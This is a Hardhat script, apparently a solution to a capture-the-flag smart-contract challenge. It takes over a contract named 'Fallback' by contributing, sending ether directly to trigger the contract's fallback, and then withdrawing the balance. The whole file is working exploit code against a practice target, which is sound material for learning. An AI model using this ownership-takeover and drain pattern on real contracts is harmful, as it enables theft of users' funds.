import { ethers } from "hardhat";

async function main() {
    const [account] = await ethers.getSigners();
    const Fallback = await ethers.getContractFactory('Fallback');
    const fallback = Fallback.attach("0x18DEcB689fabB67F2A583Be640AF0c6f6bEB0F51");

    let tx = await fallback.contribute({
        value: ethers.utils.parseEther("0.0001")
    });
    await tx.wait();

    let tx2 = await account.sendTransaction({
        to: fallback.address,
        value: ethers.utils.parseEther("0.0001")
    });
    await tx2.wait();

    let tx3 = await fallback.withdraw();
    await tx3.wait();

    console.log(account.address);
    console.log(await fallback.owner());

}


main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });